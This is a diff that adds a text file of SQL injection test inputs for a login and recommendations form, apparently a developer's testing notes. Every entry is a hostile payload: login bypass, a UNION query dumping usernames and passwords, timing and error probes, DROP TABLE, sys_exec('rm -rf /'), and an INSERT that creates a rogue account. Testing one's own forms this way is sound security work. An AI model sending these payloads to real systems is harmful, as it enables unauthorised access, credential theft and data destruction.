@@ -1,0 +1,50 @@
+===========formulario de login y consulta de recomendaciones===========
+user-->test' --
+pass-->12356
+
+user-->' or 1=1 --
+pass--> 12356
+
+user-->admin' OR '1'='1' --
+pass-->admin' OR '1'='1' --
+
+
+user-->admin'; DROP TABLE user; --
+pass-->admin'; DROP TABLE user; --
+
+user-->admin' UNION SELECT nulla, username, password FROM user --
+pass-->admin' UNION SELECT nulla, username, password FROM user --
+
+user-->admin' AND SLEEP(5) --
+pass-->admin' AND SLEEP(5) --
+
+user-->admin' OR 1=CONVERT(int, (SELECT @@version)) --
+pass-->admin' OR 1=CONVERT(int, (SELECT @@version)) --
+
+
+user-->admin' OR 1=dbo.CheckPassword('test') --
+pass-->admin' OR 1=dbo.CheckPassword('test') --
+
+user-->admin'; CREATE TABLE testtable AS SELECT 'malicious content' AS data; --
+pass-->admin'; CREATE TABLE testtable AS SELECT 'malicious content' AS data; --
+
+user-->admin'; SELECT * FROM users WHERE username = 'admin' --
+pass-->admin'; SELECT * FROM users WHERE username = 'admin' --
+
+user-->admin'; SELECT sys_exec('rm -rf /'); --
+pass-->admin'; SELECT sys_exec('rm -rf /'); --
+
+user-->admin'--
+pass-->admin'--
+
+user-->admin' OR '1'='1' --
+pass-->0x31323334
+
+user-->test'; SELECT version(); --
+pass-->test'; SELECT version(); --
+
+user-->Usuario:admin'; INSERT INTO user (username, password) VALUES ('hackerman', 'mali'); --
+pass-->Usuario:admin'; INSERT INTO user (username, password) VALUES ('hackerman', 'mali'); --
+
+
+
